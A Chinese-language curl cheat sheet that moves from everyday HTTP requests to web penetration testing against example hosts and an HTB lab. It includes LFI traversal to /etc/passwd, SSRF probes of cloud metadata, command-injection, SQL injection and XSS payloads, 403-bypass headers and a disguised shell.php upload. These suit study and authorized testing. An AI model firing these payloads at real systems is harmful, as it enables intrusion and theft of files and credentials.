# curl 常用命令总结

## 1. 基本请求

### 发送 GET 请求

curl http://example.com

### 查看响应头和响应体

curl -i http://example.com

### 只查看响应头

curl -I http://example.com

### 显示详细请求过程

curl -v http://example.com

### 更详细的调试信息

curl -vvv http://example.com

---

# 2. 常用 Header 测试

## 添加 User-Agent

curl http://example.com -A "Mozilla/5.0"

等价写法：

curl http://example.com -H "User-Agent: Mozilla/5.0"

## 添加 Referer

curl http://example.com -H "Referer: http://example.com/"

## 添加 Cookie

curl http://example.com -b "PHPSESSID=xxxx"

多个 Cookie：

curl http://example.com -b "PHPSESSID=xxxx; token=yyyy"

## 添加 Authorization

curl http://example.com -H "Authorization: Bearer TOKEN"

## 添加自定义 Header

curl http://example.com -H "X-Forwarded-For: 127.0.0.1"

curl http://example.com -H "X-Real-IP: 127.0.0.1"

curl http://example.com -H "X-Originating-IP: 127.0.0.1"

curl http://example.com -H "X-Forwarded-Host: 127.0.0.1"

curl http://example.com -H "Host: dev.example.com"

---

# 3. Host 头测试

## 访问目标 IP，但指定 Host

curl http://10.10.10.10/ -H "Host: siteisup.htb"

## 测试子域名虚拟主机

curl http://10.10.10.10/ -H "Host: dev.siteisup.htb"

## 查看响应头

curl -I http://10.10.10.10/ -H "Host: dev.siteisup.htb"

## 使用浏览器 User-Agent + Host

curl http://10.10.10.10/ -H "Host: dev.siteisup.htb" -A "Mozilla/5.0"

---

# 4. POST 表单请求

## 普通表单提交

curl -X POST http://example.com/login -d "username=admin&password=123456"

## 指定 Content-Type

curl -X POST http://example.com/login -H "Content-Type: application/x-www-form-urlencoded" -d "username=admin&password=123456"

## 带 Cookie 的 POST

curl -X POST http://example.com/login -b "PHPSESSID=xxxx" -d "username=admin&password=123456"

## 带 Header 的 POST

curl -X POST http://example.com/login -H "User-Agent: Mozilla/5.0" -H "Content-Type: application/x-www-form-urlencoded" -d "username=admin&password=123456"

---

# 5. POST JSON 请求

## 发送 JSON 数据

curl -X POST http://example.com/api/login -H "Content-Type: application/json" -d '{"username":"admin","password":"123456"}'

## 带 Authorization 的 JSON 请求

curl -X POST http://example.com/api/login -H "Content-Type: application/json" -H "Authorization: Bearer TOKEN" -d '{"username":"admin","password":"123456"}'

## 测试后端是否接收 JSON

curl -X POST http://example.com/login -H "Content-Type: application/json" -d '{"username":"admin","password":"123456"}'

---

# 6. 文件上传

## 普通文件上传

curl -X POST http://example.com/upload -F "file=@shell.php"

## 指定字段名上传

curl -X POST http://example.com/upload -F "upload=@test.txt"

## 上传文件并带其他参数

curl -X POST http://example.com/upload -F "file=@test.txt" -F "submit=Upload"

## 伪造文件类型

curl -X POST http://example.com/upload -F "file=@shell.php;type=image/jpeg"

## 修改上传文件名

curl -X POST http://example.com/upload -F "file=@shell.php;filename=shell.jpg"

---

# 7. 下载文件

## 下载并输出到终端

curl http://example.com/file.txt

## 保存为指定文件名

curl http://example.com/file.txt -o file.txt

## 使用服务器原始文件名保存

curl -O http://example.com/file.txt

## 断点续传

curl -C - -O http://example.com/bigfile.zip

---

# 8. 跟随重定向

## 跟随 301 / 302 跳转

curl -L http://example.com

## 查看跳转过程

curl -v -L http://example.com

## 只看最终响应头

curl -I -L http://example.com

---

# 9. 代理到 Burp

## HTTP 代理到 Burp

curl http://example.com -x http://127.0.0.1:8080

## HTTPS 代理到 Burp，忽略证书错误

curl https://example.com -x http://127.0.0.1:8080 -k

## 带 POST 请求代理到 Burp

curl -X POST http://example.com/login -d "username=admin&password=123456" -x http://127.0.0.1:8080

## 带 Cookie 代理到 Burp

curl http://example.com -b "PHPSESSID=xxxx" -x http://127.0.0.1:8080

---

# 10. HTTPS 和证书

## 忽略 HTTPS 证书错误

curl -k https://example.com

## 查看 HTTPS 详细连接过程

curl -vk https://example.com

## 指定 SNI / Host 场景

curl -k https://10.10.10.10/ -H "Host: dev.example.htb"

---

# 11. 超时与重试

## 设置连接超时

curl http://example.com --connect-timeout 5

## 设置整体最大请求时间

curl http://example.com --max-time 10

## 请求失败时重试

curl http://example.com --retry 3

## 设置重试间隔

curl http://example.com --retry 3 --retry-delay 2

## 综合使用

curl http://example.com --connect-timeout 5 --max-time 15 --retry 3 --retry-delay 2

---

# 12. 状态码和响应大小判断

## 只输出状态码

curl -s -o /dev/null -w "%{http_code}\n" http://example.com

## 输出状态码和响应大小

curl -s -o /dev/null -w "Status:%{http_code} Size:%{size_download}\n" http://example.com

## 输出状态码、响应时间、大小

curl -s -o /dev/null -w "Status:%{http_code} Time:%{time_total} Size:%{size_download}\n" http://example.com

## 测试目录是否存在

curl -s -o /dev/null -w "Status:%{http_code} Size:%{size_download}\n" http://example.com/admin

---

# 13. 常见信息泄露路径测试

curl -i http://example.com/robots.txt

curl -i http://example.com/.git/config

curl -i http://example.com/.env

curl -i http://example.com/.htaccess

curl -i http://example.com/backup.zip

curl -i http://example.com/index.php.bak

curl -i http://example.com/phpinfo.php

curl -i http://example.com/server-status

---

# 14. LFI / 任意文件读取测试

## 基础路径穿越

curl "http://example.com/index.php?file=../../../../etc/passwd"

## URL 编码路径穿越

curl "http://example.com/index.php?file=..%2f..%2f..%2f..%2fetc%2fpasswd"

## 双重编码

curl "http://example.com/index.php?file=..%252f..%252f..%252f..%252fetc%252fpasswd"

## php://filter 读取源码

curl "http://example.com/index.php?file=php://filter/convert.base64-encode/resource=index.php"

## 读取常见文件

curl "http://example.com/index.php?file=../../../../etc/hosts"

curl "http://example.com/index.php?file=../../../../etc/passwd"

curl "http://example.com/index.php?file=../../../../var/log/apache2/access.log"

---

# 15. SSRF 测试

## 测试访问本地

curl "http://example.com/fetch?url=http://127.0.0.1"

curl "http://example.com/fetch?url=http://localhost"

## 测试本地端口

curl "http://example.com/fetch?url=http://127.0.0.1:80"

curl "http://example.com/fetch?url=http://127.0.0.1:8080"

curl "http://example.com/fetch?url=http://127.0.0.1:3306"

## 测试云元数据地址

curl "http://example.com/fetch?url=http://169.254.169.254"

curl "http://example.com/fetch?url=http://169.254.169.254/latest/meta-data/"

## URL 编码绕过

curl "http://example.com/fetch?url=http%3A%2F%2F127.0.0.1%3A80"

---

# 16. 命令注入测试

## 常见分隔符

curl "http://example.com/ping?ip=127.0.0.1;id"

curl "http://example.com/ping?ip=127.0.0.1%3Bid"

curl "http://example.com/ping?ip=127.0.0.1|id"

curl "http://example.com/ping?ip=127.0.0.1%7Cid"

curl "http://example.com/ping?ip=127.0.0.1%26%26id"

curl "http://example.com/ping?ip=127.0.0.1%60id%60"

curl "http://example.com/ping?ip=127.0.0.1$(id)"

## 时间盲注测试

curl "http://example.com/ping?ip=127.0.0.1;sleep 5"

curl "http://example.com/ping?ip=127.0.0.1%3Bsleep%205"

---

# 17. SQL 注入基础测试

## 单引号测试

curl "http://example.com/item?id=1'"

## 布尔条件测试

curl "http://example.com/item?id=1 and 1=1"

curl "http://example.com/item?id=1 and 1=2"

## URL 编码

curl "http://example.com/item?id=1%27"

curl "http://example.com/item?id=1%20and%201%3D1"

curl "http://example.com/item?id=1%20and%201%3D2"

## 时间盲注测试

curl "http://example.com/item?id=1 and sleep(5)"

---

# 18. XSS 基础测试

## URL 参数测试

curl "http://example.com/search?q=<script>alert(1)</script>"

## URL 编码

curl "http://example.com/search?q=%3Cscript%3Ealert(1)%3C%2Fscript%3E"

## 常见 payload

curl "http://example.com/search?q=%3Cimg%20src%3Dx%20onerror%3Dalert(1)%3E"

---

# 19. 403 绕过 Header 测试

curl -i http://example.com/admin

curl -i http://example.com/admin -H "X-Forwarded-For: 127.0.0.1"

curl -i http://example.com/admin -H "X-Real-IP: 127.0.0.1"

curl -i http://example.com/admin -H "X-Originating-IP: 127.0.0.1"

curl -i http://example.com/admin -H "X-Remote-IP: 127.0.0.1"

curl -i http://example.com/admin -H "X-Client-IP: 127.0.0.1"

curl -i http://example.com/admin -H "X-Forwarded-Host: localhost"

curl -i http://example.com/admin -H "X-Original-URL: /admin"

curl -i http://example.com/admin -H "X-Rewrite-URL: /admin"

---

# 20. 路径绕过测试

curl -i http://example.com/admin

curl -i http://example.com/admin/

curl -i http://example.com/admin/.

curl -i http://example.com/admin/..

curl -i http://example.com/admin%2f

curl -i http://example.com/admin%252f

curl -i http://example.com/admin/../admin

curl -i http://example.com/%2e/admin

curl -i http://example.com/admin%09

curl -i http://example.com/admin%20

---

# 21. 保存 Cookie 和复用 Cookie

## 保存 Cookie 到文件

curl -c cookies.txt http://example.com/login

## 使用 Cookie 文件

curl -b cookies.txt http://example.com/profile

## 登录后保存 Cookie

curl -X POST http://example.com/login -d "username=admin&password=123456" -c cookies.txt

## 使用登录后的 Cookie 请求后台

curl -b cookies.txt http://example.com/admin

---

# 22. Basic Auth

## 使用 Basic Auth

curl -u admin:password http://example.com

## 只输入用户名，密码交互输入

curl -u admin http://example.com

---

# 23. PUT / DELETE / OPTIONS 方法测试

## OPTIONS 查看允许的方法

curl -X OPTIONS -i http://example.com/

## PUT 上传文件

curl -X PUT http://example.com/test.txt -d "hello"

## DELETE 删除资源

curl -X DELETE http://example.com/test.txt

---

# 24. Range 请求

## 请求部分内容

curl -H "Range: bytes=0-100" http://example.com/file.txt

## 查看是否支持断点请求

curl -I -H "Range: bytes=0-100" http://example.com/file.txt

---

# 25. 常用 HTB 排查命令

## 确认目标是否能访问

curl -I http://siteisup.htb

## 使用浏览器 UA 访问

curl -I http://siteisup.htb -A "Mozilla/5.0"

## 对比工具 UA

curl -I http://siteisup.htb -A "gobuster/3.8.2"

## 查看完整响应

curl -i http://siteisup.htb

## 查看请求过程

curl -v http://siteisup.htb

## 设置超时

curl -I http://siteisup.htb --connect-timeout 5 --max-time 15

## 测试目录响应

curl -i http://siteisup.htb/admin

curl -i http://siteisup.htb/dev

curl -i http://siteisup.htb/uploads

## 输出状态码和大小

curl -s -o /dev/null -w "Status:%{http_code} Size:%{size_download} Time:%{time_total}\n" http://siteisup.htb/admin

---

# 26. curl 常用参数速查

-X              指定请求方法
-d              发送 POST 数据
-H              添加请求头
-b              使用 Cookie
-c              保存 Cookie
-A              设置 User-Agent
-I              只看响应头
-i              显示响应头和响应体
-v              显示详细请求过程
-L              跟随重定向
-k              忽略 HTTPS 证书错误
-o              保存为指定文件
-O              使用远程文件名保存
-F              multipart 文件上传
-u              Basic Auth 认证
-x              使用代理
-s              静默模式
-w              自定义输出格式
--connect-timeout 设置连接超时
--max-time      设置请求最大时间
--retry         设置失败重试次数
--retry-delay   设置重试间隔
--path-as-is    不规范化 URL 路径
--compressed    请求压缩响应